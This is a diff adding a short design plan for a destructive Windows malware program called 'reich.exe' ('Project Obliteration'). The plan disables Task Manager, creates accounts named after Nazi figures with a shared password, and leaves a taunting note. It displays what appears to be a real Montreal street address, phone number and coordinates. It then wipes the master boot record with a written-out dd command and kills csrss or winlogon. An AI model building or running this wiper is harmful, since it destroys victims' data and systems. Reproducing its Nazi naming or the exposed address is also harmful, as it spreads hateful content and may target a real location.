@@ -1,0 +1,13 @@
+[ORIGINAL PLAN]
+Project Obliteration
+reich.exe
+
+What it will do:
+Upon clicking, user will see background image changed
+It will set some registry values (ex: DisableTaskmgr)
+Then it will reboot
+
+After rebooting, user will see 3 new accounts: REICH, FUHRER, and ERWIN. They will be password-protected; password will be "reich" (all users)
+Once signing in, a message will pop up (depending if msg.exe is present in system32; otherwise it will not pop up): kid go out its not your time to play; go touch grass
+In the desktop there will be a note (a file; .txt) that says: YOUR PC HAS BEEN OBLITERATED. ENJOY YOUR LAST MOMENTS! 
+There will be an executable named "COMEHERE.exe" (also runs at startup) it will message "1659 Sherbrooke St W, Montreal, Quebec, H3H 1E3, (514) 933-3611, 45.495674, -73.582543, Canada". Then it ends the shell (explorer.exe), re-enables cmd.exe, opens cmd.exe, paint, and notepad. Then a message pops up "30 seconds left! XAXAXAXA" after 30 seconds, the MBR will be deleted (echo 0 | dd bs=512 count=1 if=/dev/zero of=\\.\C:) then kill a critical process, either csrss or winlogon.
